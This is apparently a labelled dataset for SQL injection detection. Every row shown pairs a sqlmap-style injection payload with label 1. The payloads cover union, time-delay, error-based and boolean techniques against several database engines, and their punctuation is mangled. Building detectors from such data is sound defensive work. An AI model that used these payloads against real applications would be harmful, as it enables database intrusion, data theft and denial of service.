Sentence,Label
-6118 union all select 59065906590659065906#,1
1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000md5  (  0x6d457153   )    )   #,1
"-2106"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""dvlq"" like ""dvlq",1
-1152%'  )   or 5023  =  ctxsys.drithsx.sn  (  5023  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  ',1
-4707' union all select 441444144414441444144414#,1
"1""   )    )     )   union all select nullnullnull--",1
1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
"1"" where 8635  =  8635 and 4595  =  4595#",1
1  )   rlike sleep  (  5  ) ,1
1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  3484  =  34841   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )  --,1
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
-2086%'   )    )     )   or make_set  (  9354  =  93547185  )   and    (    (     (  '%'  =  ',1
1 and 6510  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  -- ixlk,1
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""owzc"" like ""owzc",1
1%' and 9660  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
"1"" and elt  (  4249  =  42497259  )   and ""tmxx""  =  ""tmxx",1
"1%""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  0  )  5000000000  )  null  )   and   (  ""%""  =  """,1
select   (  case when   (  9556  =  7122  )   then 9556 else 9556*  (  select 9556 from information_schema.character_sets  )   end  )  #,1
"1"" where 1386  =  1386",1
"-9672%""   )    )     )   order by 1#",1
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  4703  =  4703,1
1'  )   or extractvalue  (  1297concat  (  0x5c0x7171706a71  (  select   (  elt  (  1297  =  12971   )    )     )  0x717a767a71   )    )    and   (  'tetk'  =  'tetk,1
-7307'   )    )    union all select 5215521552155215--,1
"-2717"" or 1 group by concat  (  0x7171706a71  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   0x717a767a71floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
1'  )   and elt  (  5245  =  92039203  )   and   (  'fhlw' like 'fhlw,1
-1922%'  )   union all select 2335233523352335233523352335233523352335--,1
1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )  --,1
"1"" where 5477  =  5477",1
1' union all select nullnullnullnullnullnullnullnull#,1
1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  6270  =  62701   )    )     )  0x717a767a710x78   )    )   x   )    )     )  ||',1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  0  )  500000000  )  null  )  -- vhmc,1
1'  )   where 9454  =  9454 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  0  )  5000000000  )  null  )  --,1
1' or 5356  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  --,1
1%' union all select nullnullnullnullnullnullnullnullnull#,1
"-7306"" or 2081  =  6847",1
1 where 5700  =  5700,1
1'   )    )    as clbc where 5649  =  5649,1
-4802 union all select 7381738173817381738173817381738173817381--,1
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,1
select   (  case when   (  4994  =  1572  )   then 4994 else 4994*  (  select 4994 from mysql.db  )   end  )  #,1
-2784  )   where 5261  =  5261 or 3472  =  1728#,1
"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",1
"1""  )   rlike sleep  (  5  )   and   (  ""rfsd""  =  ""rfsd",1
1'||  (  select 'xmoq' from dual where 8047  =  8047 and 7533  =  7533  )  ||',1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  '%'  =  ',1
"select benchmark  (  5000000md5  (  0x4c4d6142   )    )    and    (    (   ""uhvy""  =  ""uhvy",1
1 and   (  1977  =  6852  )  *6852-- clxl,1
1'  )   as xhmm where 8092  =  8092 union all select nullnullnull--,1
select like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ygbf,1
"-5989%"" union all select 35813581358135813581--",1
"1"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  0  )  5000000000  )  null  )  --",1
-9078 union all select 37793779377937793779377937793779--,1
1'  )   order by 1#,1
if  (  6624  =  4232  )   select 6624 else drop function xyyt--,1
1' where 7190  =  7190 and 8148  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --,1
"select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3 and    (    (   ""vqpx"" like ""vqpx",1
1'||  (  select 'mjkz' where 9430  =  9430   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  0  )  500000000  )  null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||',1
1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9173  =  91731   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +',1
select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,1
1   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8113  =  81131   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )   and    (    (   3038  =  3038,1
1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'rvwk'  =  'rvwk,1
1 or 8156  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --,1
1'||  (  select 'scqw' where 3337  =  3337 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  5  )  --,1
1' where 6003  =  6003 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
1'||  (  select 'ttyt' where 3751  =  3751 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  --,1
-4001'   )    )    or 5634  =  4044--,1
"1%""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""%""  =  """,1
-5643'   )    )    union all select 15151515#,1
iif  (  3548  =  864611/0  )  ,1
1  )   union all select nullnullnullnullnullnull--,1
-4826 union all select 45324532453245324532--,1
1' in boolean mode  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  #,1
1'||  (  select 'xbwg' where 7518  =  7518 union all select nullnullnullnullnullnull--,1
1 where 5099  =  5099 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  5  )  --,1
"1%"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   and ""%""  =  """,1
"1"" where 3368  =  3368 and 9254  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --",1
"1""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )  --",1
-9382'  )   union all select 4774477447744774--,1
-3752%' union all select 9351--,1
1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )   and    (    (   'ykxz'  =  'ykxz,1
1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )  --,1
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",1
1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
-8929' union all select 532453245324532453245324--,1
end and 'aenf'  =  'aenf,1
-2372' or 1783  =  2656,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ) ,1
1'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --",1
"-3782%""  )   or make_set  (  9354  =  93547185  )   and   (  ""%""  =  """,1
1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
-5606  )   union all select 711871187118711871187118711871187118#,1
select pg_sleep  (  5  )   and   (  'itgc'  =  'itgc,1
-9240' union all select 653865386538#,1
select case when 7634  =  3954 then 1 else null end--,1
1'  )   where 9381  =  9381 or elt  (  6272  =  6272sleep  (  5   )    )   --,1
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,1
1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
1%'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --,1
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,1
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#,1
1'  )   where 4500  =  4500,1
1%'   )    )     )   union all select nullnullnullnullnullnullnullnullnullnull--,1
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'nhrc' like 'nhrc,1
"-6357""  )   union all select 976797679767976797679767976797679767#",1
1'  )   where 5680  =  5680 and   (  3020  =  3020  )  *6703--,1
1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  5  )   and    (    (   'jylk'  =  'jylk,1
1   )    )    as jmcp where 8624  =  8624 union all select nullnullnullnullnullnullnullnullnullnull--,1
"1"" or   (  select 9173 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9173  =  91731   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",1
-8794   )    )     )   union all select 580258025802--,1
"1%"" or 8466  =  benchmark  (  5000000md5  (  0x694a4745   )    )    and ""%""  =  """,1
"1""   )    )    as nhus where 3689  =  3689",1
"-3228""  )   or   (  5901  =  1570  )  *1570 and   (  ""egdd""  =  ""egdd",1
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
select * from generate_series  (  77627762case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--,1
-3997'+  (  select 'avjk' where 1917  =  1917 union all select 191719171917--,1
-1722' union all select 140814081408#,1
-1940 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',1
1  )   as bidc where 5268  =  5268 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
1' and updatexml  (  3393concat  (  0x2e0x7171706a71  (  select   (  elt  (  3393  =  33931   )    )     )  0x717a767a71  )  1161  )  ,1
1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,1
1 where 3744  =  3744,1
1  (  select 6825 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  6825  =  68251   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ,1
"1""  )   as eaxo where 2728  =  2728",1
"1""   )    )    as tsry where 6594  =  6594 or row  (  10457562  )  >  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  1045  =  10451   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",1
1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  5  )   and 'rupq'  =  'rupq,1
-3501'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'spvx'  =  'spvx,1
1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  0  )  5000000000  )  null  )  --,1
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8190  =  81901   )    )     )  0x717a767a710x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'brhc' like 'brhc,1
select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,1
